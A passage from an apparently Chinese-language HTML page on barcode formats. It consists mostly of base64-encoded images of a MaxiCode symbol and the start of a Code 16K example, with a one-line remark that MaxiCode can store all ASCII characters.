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5hjDlT3I8cEOqkeXzmMhfB6aqAGNt6/c5u8M0POUbVeOcwxB6r7kWMCnVSPrxzGQjilGigAAIAc8Vt4AAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQAAAATjRQyE5RFPbJT37SZsyYYf39/bZlyxZbunSpTZs2rZLX37Vrl5111ll20EEHWavVsk984hPWarW6+u9f//Vfzcxs5cqVNn78eNfr/vjHP7bly5dbq9WyP/zDP4wxNcnXX7t2rbVaLZswYYL9+Mc/HvHnnnrqqYE6f/3rX4+aacmSJTZjxowhf75r1y77/Oc/byeddJLNnDnTJk2aZEceeaStWLHC7r///ihZbrnlFmu1WrZlyxb3titXrrQJEybYcccdZ9/+9rcjpAN0+a7AQANs3brVbr75Zlu6dKmtXr3ajj322Epff926dXbvvffamjVrbOXKlbZz50475phjBv7+tddes9/5nd+xhQsX2sc//vFB286ZM6en19ywYYNddNFFNnXq1FLZe5X69c3Mxo0bZ7fddptdddVVw/79l7/8ZZswYYL97Gc/i57lwx/+sJ1wwgmD/uyZZ56xM844w7Zv326LFi2yT33qU3bQQQfZD37wA7vvvvts06ZNds4559jtt99uEyZMiJ6xG1/4whfsN3/zN+3888+3Cy+80B599NHUkYDqFEBm7rnnnsLMir/8y78c+LMPfvCDxdSpUyt5/bPPPruYPn16sW/fvmH//oUXXijMrFixYsWIY6xYsaLo6+vr6vX+7d/+rejr6ys++9nPFo8++mhhZsUNN9zQU/ZepH79G2+8sTCz4vTTTy/mzZs3bN13795dzJw5s3j/+99fmFnxta99rbJ8RVEUO3bsKA4//PCiv7+/uO+++4b8/Z49e4qzzz67MLPimmuuCfraX/rSlwozK/76r/+65zE+9rGPVXb+ACr4CA9ZWbJkiZ111llmZrZq1SprtVojfjTy4IMP2mmnnWYHHXSQTZkyxRYsWGBXX3217d69e8jPrlu3zn7+53/e+vv77eijj7YvfvGL9ld/9VfWarVs06ZNg352z549NmPGDGu1WqXmMn78eHvxxRftN37jN2zWrFk2adIkO/744+3v//7vB/3cwQcfbI888ohdffXV1tfXN+qYL730kl1yySU2b948mzx5ss2aNctOPfVUe/DBB3vOmfr125YtW2bbtm2zhx9+eMjf3Xffffbyyy/b8uXLh922m2Nhy5YtNm7cOLv00ksHbbtt2zabMmWKLV261IqiMLOhH+GtX7/etm/fbmvWrLEzzzxzyOv39/fbbbfdZp/5zGfs5JNPHvR3W7dutWXLltnMmTNt4sSJdsQRR9hFF11k//u//ztknJtuusnmzZtn/f399s53vtOuvfZa27dv37Bz/ud//mdbsWKFzZo1y/r7+23evHl25ZVX2quvvjrkZ9/2trfZnj17hh0HaKzUHRxQpf/8z/8sbrjhhsLMiuuuu6546qmnih07dgy5A7V58+ai1WoVixcvLu69997ioYceKi655JLCzIrVq1cPGnP9+vWFmRWLFy8uNm7cWGzYsKF497vfXSxevHjYf9mvWLGiOOKII0bM2O0dqIMOOqhYtGhR8ZnPfKZ44IEHihtvvLE4+OCDi9mzZxd79uwZdrvHHnts1DtAS5YsKaZPn16sW7eu+PrXv17cc889xfLly4tx48YVDz/88Ih5upXi9dt3oJ555plixowZxTnnnDPkZ04//fTiuOOOK+6+++4hd6A8x8LFF19c9PX1FU888cSgsWfNmlU899xzg/5s+vTpA/9//PHHF319fcXLL7/smts3vvGNYvz48cUJJ5xQbNiwofi7v/u74sYbbyymTZtWHHPMMcXu3bsHfvZP/uRPCjMrPvCBDxQPPvhg8cADDxRnnHFGccwxxww5Tp944omiv7+/WLhw4cC411xzTTFlypTilFNOKd54441BOS699NKu74gCTUEDhey03yTvuuuugT/rbKBuvPHG4pRTTil+8pOfDNr2xBNPLA466KBBf3bUUUcVs2fPHvRmtWPHjuKwww6L2kCZWfHHf/zHg/7893//9wszKx599NFhtxutgdm9e3cxbty44oILLhj053v37i0+97nPFY888siIebqV4vXbDdR3v/vdYvXq1UV/f3/x4osvDvz997///aLVahU333zzsA2U51j46U9/WrzrXe8qFi5cWOzdu7e49dZbCzMb8rFcZwM1efLkYsGCBe65HX/88cXBBx9cvPTSS4P+fN26dYWZFbfddtvAn82bN6847LDDBjXX+/btK4499tghx+nJJ59cHHroocULL7wwaNwvfOELhZkVGzduHPTnNFDIER/hAcO45JJL7Jvf/KbNnj170J8vWLDAdu3aZS+99JKZme3cudO+973v2WmnnWaTJk0a+Lnp06fb2WefPezY//M//xPsy9SrVq0a9P9HH320mZk9//zz7rEmTpxos2fPtgceeMDuv//+gS9TT5gwwdasWWOLFi0qHzjx619wwQX2f//3f/YXf/EXA39266232sSJE4fUsq3bY8HMbPLkyXbnnXfav//7v9vll19ul112mZ1//vnDfizX9sYbb9ju3btt+vTprrm8/PLL9k//9E92+umn28yZMwf93YoVK8zMBj6ufP75523btm122mmnWX9//8DPtVot+7Vf+7VB2+7cudO2bt1qS5YssWnTptmePXsG/vvQhz5kZmaPPPLIoG2mTJlib7zxhr344ouuOQB1RgMFDGP37t12/fXX2/ve9z6bPXu2TZ482SZNmmR33HGHmdnA90bavxY/3G/Hvetd7xr0/3v37rUNGzbY448/bh/+8IdLZ+zr6xvypt7+7aw33njDPd64ceNs8+bNNmvWLDvzzDNt5syZtnTpUlu7dq3t2LGjdF6F1z/uuOPs2GOPtVtuucXM3tyPt99+u61cuXJIE9LW7bHQ9t73vtc++9nP2k033WTTpk2zm266adRMfX19NnXqVHfz8aMf/cjMzObOnTvk737u535u0M/85Cc/MTOzt7/97UN+tvPYfe6552zfvn1211132eTJkwf9N2/ePDMz++///u9B2yxfvtz6+vrsqquusldeecU1D6CuaKCAYXzkIx+xK664wk466ST76le/ak8++aQ9/fTTQ+4ktL84O27c0FOp88/OPvtsO+ecc+yjH/2oXX311fHCl/De977XvvOd79jWrVvt8ssvt507d9qnP/1pO/rooytZ56eK17/gggvsmWeesSeeeMK+9rWv2fbt2+38888f8ee7PRYO9Mwzz9i4cePs+eeft+3bt4+ZaeHChbZt2zZ77rnn3PMp9n8xfbg/6+YXFUZqtlesWGGPPfbYsP91Hr8nnnii3X777fZnf/Znw65vBTQRDRTQ4Uc/+pFt3rzZfvVXf9XWrl1rixcvtne/+922YMGCIXdCDj30UDN782O5Ts8+++yg/7/uuuvsiiuusNtvv92+9KUvxZtASa1Wy97//vfbmjVr7Fvf+pY9/vjj9sorr9iaNWsa8frnnnuu9ff324YNG+yOO+6wuXPn2pIlS4b9Wc+x0HbnnXfaV7/6VfvzP/9ze+c732nnnnuu7d27d9RMH/nIR6woCvv85z8/4s+8/vrrtmjRooHf8ps7d661Wq1hG7Qf/vCHAz9j9tZx2r4TdaAf/OAHg/5/7ty51tfXZ7t377YTTzxx2P8WLFgwaJtnn33WLrzwQjv55JOH/S1HoIlooIAO7Te79scgbU8++eTAm0P7X+1z5syxt7/97fbNb37TXn/99YGf3bVrl23YsGHQ9r/wC79g1113nS1cuNDWr18fcwo9eeqpp2zVqlW2bdu2QX9+wgkn2KGHHjrsr8XX8fUPOeQQO/PMM23z5s22efNm+9jHPjbsHUQz37Fg9uZHWxdffLGdddZZdu6559qtt95q3/72t+33fu/3Rs30W7/1WzZ//nxbt26d3XzzzUP+/rXXXrNVq1bZ1q1b7YgjjjCzN79nd9JJJ9k3vvGNIR//3XvvvWZm9sEPftDMzN7xjnfY3Llz7aGHHhq09MLevXtt48aNg7adOnWqnXzyyfa3f/u39v3vf3/Q3z3zzDP28Y9/fMg/Dr7yla/Yzp077bbbbrNTTz111LkCTcFK5ECHI444wo466ii766677JRTTrGjjjrKtm7dauvXr7eLL77YbrrpJrvjjjvs13/91+3www+31atXD6zf84lPfMJ++tOf2jXXXGO/9Eu/NOyjQ4488kj7l3/5l8rm88QTTwx8/PW9731v4M/a3wOaP3++nXrqqTZ37lzbsmWL/eM//qN9+tOftnnz5tmePXvs7rvvtueee86uueaaWr7+cC644ALbsGGDtVotO++880b8Oc+xMHfuXDvvvPNs/Pjx9sUvftHM3vxo65JLLrE/+qM/suXLl4/YXEydOtU2b95sy5Yts09+8pN2yy232NKlS23mzJn2X//1X3bPPffYCy+8YL/7u79rn/rUpwa2u/766+1XfuVXbOnSpXb55ZfbrFmz7Mknn7TPfe5z9su//MuDvmv327/923bZZZfZsmXLbPXq1bZ3715bv369HXbYYUOa1htuuMFOOeUUW7x4sV111VU2f/58+4//+A+79tprrb+/366//vpBP79z507r6+sb9vtYQGMl/i1AoHLdLGPw9NNPF4sXLy6mTZtWHHLIIcWZZ55ZfPe73y1++MMfFu95z3uK/v7+4tprry2Koihef/314sorryzmzJlTTJo0qfjFX/zF4s477xz4FfYtW7YMev1QyxgM92vjd911V2Fmxd133z3wZ5deemlhZiP+d+655w787LPPPlusWrWqmDNnTjFx4sTibW97W7Fo0aLiK1/5ysgFHUPq1z9wGYO2ffv2FUceeWSxePHiQT873DIG3R4La9euHXJcFcWbSxscffTRxeGHHz6wzlPnMgZtr732WnH99dcXJ554YjFjxoxi0qRJxfz584tzzjmnePzxx4ed32OPPVZ84AMfKKZPn15MmDChmDdvXnHFFVcUr7766qCf27dvX3HttdcWRxxxRDFhwoTiyCOPLK699tpi06ZNhZkVmzZtGvTzTz31VLFy5crikEMOKfr6+oo5c+YUF1100aD1rNpYxgA5ahXFMN9ABFDaddddZ1deeaV961vfspNOOmngz1euXGlPP/30kO+eAHV12WWX2dq1awd9jA00Hd+BAkr60z/9UzvjjDOG/Pr23/zN39jEiRPtPe95z6A/7+/vt1deeWXY354C6ujFF18ctL4UkAMaKKCkd7zjHfbggw/a8uXL7e6777ZNmzbZRz/6UXv44YftwgsvtIMPPnjQzy9cuNB27Nhhf/AHf1Dpd6GA0LZv324bN260jRs32rHHHps6DlApPsIDArj//vvthhtusO985zu2e/dumz9/vp133nl26aWXDvkNr127dtl5551nDz30kL322mv2s5/9zMaPr8fvc2zZssWWLVvW1c++733vs3/4h39o1OtjsJUrV9rmzZtt4cKFduutt9JEISs0UAC69uqrr3b93a0pU6bYUUcd1ajXB4A2GigAAAAnvgMFAADgRAMFAADgRAMFAADgRAMFAADg9P/bQ9XUHViWZAAAAABJRU5ErkJggg==" alt="MaxiCode">
<figcaption aria-hidden="true">MaxiCode</figcaption>
</figure>
<p>能存储所有 ASCII 字符。</p>
<h2 id="code-16k-码">Code 16K 码</h2>
<figure>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAaIAAAFGCAYAAAAo3pv7AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAHz5JREFUeJzt3X1YFXX+//HXEVC5ExCTLNS8A43Ubkjrm2mbkdp62eVdVKRt2+2GXaa1qd1qretaWdulrduWVyZtWRh5syphilmuFq2ZWUpqaloK4f0dgvD5/cGPuQ5yDh7gyAf0+bgurmt0Zj7znpkz53Vm5nPmuIwxRgAAWNLIdgEAgPMbQQQAsIogAgBYRRABAKwiiAAAVhFEAACrAqsa6XK56qoOAMA5ztu3hTgjAgBYRRABAKwiiAAAVhFEAACrquyscK48hq42nS583QaeluFpXl+n85Wv61ab9fC1vbrYBv7uQONrfb7O64mtbVob/t4u7HN7+81XtvavxBkRAMAygggAYBVBBACwiiACAFhFEAEArCKIAABWEUQAAKsIIgCAVQQRAMAqgggAYBVBBACwiiACAFhFEAEArCKIAABWEUQAAKsIIgCAVQQRAMAqgggAYBVBBACwiiACAFhFEAEArCKIAABWEUQAAKsIIgCAVQQRAMAqgggAYBVBBACwiiACAFhFEAEArCKIAABWEUQAAKsIIgCAVQQRAMAqgggAYBVBBACwiiACAFhFEAEArCKIAABWEUQAAKtcxhhju4izzeVy2S4BAM4r1YkWzogAAFYRRAAAqwgiAIBVBBEAwKpA2wXUJ77eXPO184On9jzN6+/+IrVZRkOc19f2fFWb/Vab14Yn/u5oU5/WzZO62H716bj0pD69rurqdcoZEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrXMYYY7uIs83lctkuAQDOK9WJFs6IAABWEUQAAKsIIgCAVQQRAMCqQNsF1Ceebq752tHB1xtzntqrT8v1VW3q8/e6eVKf9pu/+wPZ2va8Ju2150lttp+/560tzogAAFYRRAAAqwgiAIBVBBEAwCqCCABgFUEEALCKIAIAWEUQAQCsIogAAFYRRAAAqwgiAIBVBBEAwCqCCABgFUEEALCKIAIAWEUQAQCsIogAAFYRRAAAqwgiAIBVBBEAwCqCCABgFUEEALCKIAIAWEUQAQCsIogAAFYRRAAAqwgiAIBVBBEAwCqCCABgFUEEALCKIAIAWEUQAQCsIogAAFYRRAAAqwgiAIBVBBEAwCqCCABgFUEEALCKIAIAWOUyxhjbRZxtLpfLdgkAcF6pTrRwRgQAsIogAgBYRRABAKwiiAAAVgXaLsAWf/fR8NQhwtMyajOdr87ldfOkNsvwdVv5exv4ugxPzrdt6it/bz9/11KfjsvaOBvL4IwIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUEEQDAKoIIAGAVQQQAsIogAgBYRRABAKwiiAAAVhFEAACrCCIAgFUuY4yxXcTZ5nK5bJcAAOeV6kQLZ0QAAKsIIgCAVQQRAMAqgggAYFWg7QJs8XQjrTadGny9MedpGbWppT